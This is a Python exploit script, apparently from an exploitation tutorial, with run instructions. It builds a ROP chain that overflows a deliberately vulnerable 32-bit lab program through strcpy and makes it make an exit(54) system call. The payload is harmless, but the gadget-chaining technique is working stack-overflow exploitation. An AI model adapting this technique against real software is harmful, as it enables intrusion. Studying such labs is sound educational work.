import pathlib
from exploitsCommon import *


# In order to run this exploit:
# - Run in a terminal:
#     - mkfifo ./bin/mypipe
#     - cat ./bin/mypipe | ./bin/vulnerable32bit.exe strcpy ; echo Return code is $?
# - Run in another terminal:
#     - python3 ./exploits/payloadSyscallExit32.py && cat ./exploits/payloadSyscallExit32.dat > ./bin/mypipe
# - Go back to the first terminal and wait a few seconds.


if __name__ == "__main__":
    Utils.changeCWDToScriptDirectory()

    print('Scanning bytes...')
    eb = ExploitBuilder(targetProcessName='vulnerable32bit.exe',
                        archBitSize=32,
                        extraToolOptions=['--no-null'])

    # The vulnerable executable will call `exit(returnCode)`;
    # We add some 0xFF "padding" so that there are no null bytes in this 4-byte value.
    # The extra bytes are ignored by `exit()` anyway.
    returnCode = 54
    returnCode = 0xFFffFF00 + returnCode

    estimationOfLocalStackByteSize = 200

    payloadComponents = [
        # A "NOP" sled. It's long enough to go over the stack buffer and cover the stored return address.
        eb.getBytesOfInstrSeqAddress('ret') * (estimationOfLocalStackByteSize // eb.archByteSize),

        # EBX = returnCode;
        eb.getBytesOfInstrSeqAddress('pop ebx; ret'),
        (returnCode).to_bytes(4, 'little'),

        # EAX = 1; (system call number for `exit();`)
        eb.getBytesOfInstrSeqAddress('xor eax, eax; ret'),
        eb.getBytesOfInstrSeqAddress('inc eax; ret'),

        # Make a system call. In our case, call `exit(EBX);`
        eb.getBytesOfInstrSeqAddress('int 0x80; ret'),
    ]

    # Concatenate payload
    payload = b''.join(payloadComponents)

    # Prepend the size of the payload to itself
    payloadSize = len(payload)
    payload = payloadSize.to_bytes(4, sys.byteorder) + payload

    print()
    print(f"len(payload) = {len(payload)}")
    print(f"payload = {payload.hex()}")

    scriptFileNameWithoutExtension = pathlib.Path(__file__).stem
    with open(f'{scriptFileNameWithoutExtension}.dat', 'wb') as fout:
        fout.write(payload)
